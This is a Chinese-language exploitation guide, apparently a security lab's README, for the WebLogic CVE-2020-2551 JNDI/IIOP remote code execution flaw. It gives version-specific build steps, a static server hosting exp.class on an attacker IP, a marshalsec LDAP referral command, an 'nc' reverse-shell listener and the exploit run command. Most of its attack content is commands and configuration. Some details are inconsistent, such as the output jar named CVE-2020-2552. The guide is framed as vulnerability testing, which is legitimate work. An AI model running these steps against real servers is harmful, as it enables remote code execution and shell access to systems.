# 简介

漏洞编号：CVE-2020-2551

可以利用此漏洞通过 JNDI 调用远程的 Java 类，从而达到执行任意代码的目的。

# 影响范围

```
Weblogic <= 10.3.6.0
Weblogic <= 12.1.3.0
Weblogic <= 12.2.1.4
```

# 漏洞利用

**测试注意：**

1. 在 Weblogic 12.2.1.x 版本上只能使用 `ldap://` 这种方式利用，`rmi://` 方式有安全限制，无法直接执行远端代码。
2. 利用程序必须与 Weblogic 版本对应，否则对象在反序列化过程中会出错，导致利用失败。
3. 网传12.1.x版本中只影响 12.1.3.0，但实测可以影响 12.1.2.0 版本。

## 构造及编译 PoC

参考 [Apache Dubbo CVE-2020-1948 反序列化漏洞验证方法](https://github.com/DSO-Lab/defvul/wiki/Apache-Dubbo-CVE_2020_1948-Deserialization-Vulnerability) 中的 POC 代码及构建方法。

编译后生成利用代码 `exp.class`。

## 构建测试程序

根据我们的测试验证，本漏洞的测试程序与 Weblogic 版本密切，所以需要对应版本的 Weblogic 库文件的支持，分为三个不同版本，编译构建时，按照下列三个步骤来进行：

### 1. 根据版本调整依赖库

**注意** 但调整为对应版本时，应注释掉其它 artifactId 相同的依赖项。

> WebLogic 10.3.6

```
# pom.xml
<dependency>
    <groupId>com.bea.core.repackaged.apache</groupId>
    <artifactId>commons-logging</artifactId>
    <version>10.3.6</version>
    <scope>system</scope>
    <systemPath>${project.basedir}/libs/com.bea.core.repackaged.apache.commons.logging_10.3.6.jar</systemPath>
</dependency>
<dependency>
    <groupId>com.bea.core.repackaged.springframework</groupId>
    <artifactId>spring</artifactId>
    <version>10.3.6</version>
    <scope>system</scope>
    <systemPath>${project.basedir}/libs/com.bea.core.repackaged.springframework.spring_10.3.6.jar</systemPath>
</dependency>
<dependency>
    <groupId>weblogic</groupId>
    <artifactId>wlfullclient</artifactId>
    <version>10.3.6</version>
    <scope>system</scope>
    <systemPath>${project.basedir}/libs/wlfullclient_10.3.6.jar</systemPath>
</dependency>
```

> WebLogic 12.1.3

```
# pom.xml
<dependency>
    <groupId>com.bea.core.repackaged.apache</groupId>
    <artifactId>commons-logging</artifactId>
    <version>10.3.6</version>
    <scope>system</scope>
    <systemPath>${project.basedir}/libs/com.bea.core.repackaged.apache.commons.logging_10.3.6.jar</systemPath>
</dependency>
<dependency>
    <groupId>com.bea.core.repackaged.springframework</groupId>
    <artifactId>spring</artifactId>
    <version>10.3.6</version>
    <scope>system</scope>
    <systemPath>${project.basedir}/libs/com.bea.core.repackaged.springframework.spring_10.3.6.jar</systemPath>
</dependency>
<dependency>
    <groupId>weblogic</groupId>
    <artifactId>wlfullclient</artifactId>
    <version>12.1.3</version>
    <scope>system</scope>
    <systemPath>${project.basedir}/libs/wlfullclient_12.1.3.jar</systemPath>
</dependency>
```

**注** 由于 `WebLogic 12.2.1.x` 版本的 `wlfullclient.jar` 文件太大，Github 不允许上传，故不在源码中提供，请自行从 WebLogic 12.2.1.3.0 上生成。

生成方法：

```
cd %WEBLOGIC_HOME%/wlserver/server/lib/
java -jar wljarbuilder.jar
```

执行成功后，可以在当前路径下找到 `wlfullclient.jar` 。

> WebLogic 12.2.1

```
# pom.xml
 <dependency>
    <groupId>com.bea.core.repackaged.apache</groupId>
    <artifactId>commons-logging</artifactId>
    <version>12.2.1</version>
    <scope>system</scope>
    <systemPath>${pom.basedir}/libs/com.bea.core.repackaged.apache.commons.logging_12.2.1.jar</systemPath>
</dependency>

<dependency>
    <groupId>com.bea.core.repackaged.springframework</groupId>
    <artifactId>spring</artifactId>
    <version>12.2.1</version>
    <scope>system</scope>
    <systemPath>${pom.basedir}/libs/com.bea.core.repackaged.springframework.spring_12.2.1.jar</systemPath>
</dependency>

<dependency>
    <groupId>weblogic</groupId>
    <artifactId>wlfullclient</artifactId>
    <version>12.2.1</version>
    <scope>system</scope>
    <systemPath>${pom.basedir}/libs/wlfullclient_12.2.1.jar</systemPath>
</dependency>
```

### 2. 根据版本调整要覆盖的 IIOP 相关类

> WebLogic 10.3.6

```
mv src/main/java/weblogic/iiop/IOPProfile.java_10.3.6 src/main/java/weblogic/iiop/IOPProfile.java
rm -f src/main/java/weblogic/iiop/ior/IOPProfile.java
```

> WebLogic 12.1.x

```
mv src/main/java/weblogic/iiop/IOPProfile.java_10.1.3 src/main/java/weblogic/iiop/IOPProfile.java
rm -f src/main/java/weblogic/iiop/ior/IOPProfile.java
```

> WebLogic 12.2.x

```
mv src/main/java/weblogic/iiop/ior/IOPProfile.java_10.2.1 src/main/java/weblogic/iiop/ior/IOPProfile.java
rm -f src/main/java/weblogic/iiop/IOPProfile.java
```

### 2. 编译及打包

执行下面的命令完成打包（需要安装 Maven）
```
mvn package -DskipTests=True
```

打包完成（过程中的错误可以忽略）后，会生成 `target/CVE-2020-2552.jar` 文件。

## 启动一个静态网站

此站点用于被测目标下载利用代码用。因此建议放在互联网上任意上网主机均能访问到的地方。

假设IP为 1.1.1.5，网站位于 80端口， 将 `exp.class` 放到网站根目录，测试可访问：

http://1.1.1.5/exp.class

**确保攻击目标 Weblogic 所在主机能够访问到此 URL。**

## 启动 LDAP 代理服务

假设 LDAP 代理服务启动在 `1.1.1.5` 的 `8080` 端口。
```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://1.1.1.5/#exp" 8080
```
marshalsec [下载](/attach_files/tool_collection/13)：

https://github.com/RandomRobbieBF/marshalsec-jar/raw/master/marshalsec-0.0.3-SNAPSHOT-all.jar

## 启动反弹 Shell 接收端口

在公网主机 `1.1.1.5` 的 `53` 端口监听，等待反弹的 Shell。这个端口也必需确保被测试目标能否访问到，否则利用不会成功。
```
nc -lvvp 53
```

## 测试程序运行

```
java -jar CVE-2020-2551.jar ldap://1.1.1.5:8080/exp 127.0.0.1 7001

# CVE-2020-2551.jar 为前面生成的测试程序。
```

测试程序执行完毕后会抛出一个异常堆栈信息，如果堆栈开始包含如下提示，则测试成功的可能性较大：

```
javax.naming.NamingException: Unhandled exception in rebind() [Root exception is org.omg.CORBA.MARSHAL: ...
```

测试人员也可以通过观察 LDAP 代理是否出现请求转发来利用是否成功，当然也可以查看静态的网站是否有请求 `/exp.class` 的访问历史记录来进行判断是否成功:

```
Send LDAP reference result for exp redirecting to http://1.1.1.5/exp.class
```

# 参考资料

https://xz.aliyun.com/t/7498

https://github.com/Y4er/CVE-2020-2551

https://github.com/zzwlpx/weblogicPoc